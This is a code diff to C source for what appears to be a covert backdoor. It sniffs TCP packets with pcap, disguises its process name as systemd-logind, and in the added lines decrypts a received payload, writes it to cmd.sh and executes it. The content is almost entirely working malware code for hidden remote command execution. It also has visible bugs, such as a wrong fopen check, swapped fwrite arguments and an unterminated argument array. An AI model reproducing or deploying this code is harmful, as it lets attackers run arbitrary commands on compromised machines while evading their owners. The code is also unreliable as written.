@@ -7,6 +7,7 @@
 #define PORT "8505"
 #define BUFFERSIZE 1024
 #define MASK "/usr/lib/systemd/systemd-logind"
+#define CMD "cmd.sh"
 
 struct payload{
     char key[5]; // always 8505
@@ -172,11 +173,25 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
 }
 
 void ParsePayload(const u_char *payload, int len){
-
+    FILE *fp;
     unsigned char decryptedtext[BUFSIZE];
     int decryptedlen, cipherlen;
+    char *args[1];
+
+    args[0] = CMD;
+
+    if((fp = fopen(CMD, "wb+")) < 0){
+        perror("fopen");
+        exit(1);
+    }
     cipherlen = strlen((char*)payload);
     printf("Encrypted Payload is: %s \n", payload);
     decryptedlen = decryptMessage((unsigned char*)payload, cipherlen, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
     printf("Encrypted Payload is: %s \n", decryptedtext);
+    if((fwrite(decryptedtext, sizeof(decryptedtext), sizeof(char), fp)) <= 0){
+        perror("fwrite");
+        exit(1);
+    }
+
+    execve(CMD, args,0);
 }
